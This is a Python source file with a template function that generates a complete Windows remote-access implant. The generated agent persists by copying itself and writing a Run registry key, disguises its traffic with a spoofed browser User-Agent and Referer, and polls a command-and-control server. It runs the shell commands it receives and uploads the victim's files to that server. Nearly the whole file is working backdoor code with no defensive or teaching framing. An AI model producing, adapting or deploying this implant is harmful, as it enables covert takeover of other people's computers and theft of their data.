def http_agent_template(lhost, lport):
    return f"""import requests
import subprocess
import time
import uuid
import os
import sys
import shutil
import winreg as wreg
import random

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "https://www.facebook.com/"
}

Lhost={lhost}
Lport={lport}

SERVER_URL = 'http://127.0.0.1:5001'
AGENT_ID = str(uuid.uuid4())
REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'

global current_working_directory
current_working_directory = os.getcwd()

current_executable = sys.executable
documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
destination_executable = os.path.join(documents_dir, "client.exe")

def ensure_persistence():
    try:
        documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
        if not os.path.exists(documents_dir):
            os.makedirs(documents_dir)
        destination_executable = os.path.join(documents_dir, "client.exe")
        if not os.path.exists(destination_executable):
            shutil.copy(current_executable, destination_executable)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_SET_VALUE)
            wreg.SetValueEx(key, "MyApp", 0, wreg.REG_SZ, destination_executable)
            wreg.CloseKey(key)
    except Exception as e:
        print(f"Error ensuring persistence: {{e}}")
        
def execute_command(command):
    global current_working_directory
    if command.startswith("download "):
        # This is a command for the agent to upload a file to the server
        filename = command.split(" ", 1)[1]
        return upload_file_to_server(filename)
    elif command.startswith("upload "):
        # This is a command for the agent to download a file from the server
        filename = command.split(" ", 1)[1]
        return download_file_from_server(filename)
    elif command.startswith("cd "):
        directory = command.split(" ", 1)[1]
        try:
            new_dir = os.path.join(current_working_directory, directory)
            os.chdir(new_dir)
            current_working_directory = os.getcwd()  # Update the global variable to new directory
            return f"Changed directory to {{current_working_directory}}"
        except Exception as e:
            return f"Error changing directory: {{e}}"
    else:
        try:
            # Use the updated current working directory for executing commands
            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True, cwd=current_working_directory)
            return result.stdout or result.stderr or "Executed command successfully."
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {{e.output}}"
        except Exception as e:
            return f"Error: {{e}}"

def upload_file_to_server(filename):
    # Change here to check the file in the current directory instead of DOWNLOAD_DIR
    file_path = filename
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                files = {'file': (filename, f)}
                response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, allow_redirects=True)
                #response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
                if response.status_code == 200:
                    return "File Downloaded successfully."
                else:
                    return f"Failed to Download file. Status: {{response.status_code}}, Response: {{response.text}}"
        else:
            return "File does not exist."
    except Exception as e:
        return f"Error: {{e}}"
      
def download_file_from_server(filename):
    # Adjust to the new server endpoint for fetching files
    download_url = f"{{SERVER_URL}}/fetch_file/{{AGENT_ID}}/{{filename}}"
    try:
        response = requests.get(download_url, headers=headers, allow_redirects=True)
        #response = requests.get(download_url, headers=headers, verify=SERVER_CERT, allow_redirects=True)
        if response.status_code == 200:
            file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return "File Uploaded successfully."
        else:
            return f"Failed to Upload file. Status: {{response.status_code}}, Response: {{response.text}}"
    except Exception as e:
        return f"Error: {{e}}"

def send_output(output):
    try:
        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, allow_redirects=True)
        #response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
        print("Response Status:", response.status_code)
        print("Response Text:", response.text)
        if response.ok:
            print("Output sent successfully")
        else:
            print("Failed to send output")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {{e}}")

def register_agent():
    while True:
        try:
            response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID}, headers=headers, allow_redirects=True)
            if response.ok:
                print("Agent registered successfully")
                break  # Break the loop if registration is successful
            else:
                print("Failed to register agent. Retrying...")
                time.sleep(random.randint(5, 10))  # Random sleep between retries
        except requests.exceptions.ConnectionError:
            print("Unable to connect to the server. Retrying in a few seconds...")
            time.sleep(random.randint(5, 10))
        except requests.exceptions.RequestException as e:
            print(f"Network error: {{e}}")
            time.sleep(random.randint(5, 10))

def main():
    ensure_persistence()
    register_agent()
    while True:
        try:
            response = requests.get(COMMAND_ENDPOINT, params={'agent_id': AGENT_ID}, allow_redirects=True)
            if response.status_code == 200:
                command_to_execute = response.json().get('command', '')
                if command_to_execute:
                    output = execute_command(command_to_execute)
                    send_output(output)
            # Consider introducing some delay here as well if you don't want to constantly poll the server
            time.sleep(random.randint(5, 10))  # Random sleep between retries
        except requests.exceptions.ConnectionError:
            print("Unable to connect to the server. Retrying in a few seconds...")
            time.sleep(random.randint(5, 10))  # Random sleep between 5 to 10 seconds
        except requests.exceptions.RequestException as e:
            print(f"Network error: {{e}}")
            time.sleep(random.randint(5, 10))  # Random sleep on other network errors

if __name__ == "__main__":
    main()

"""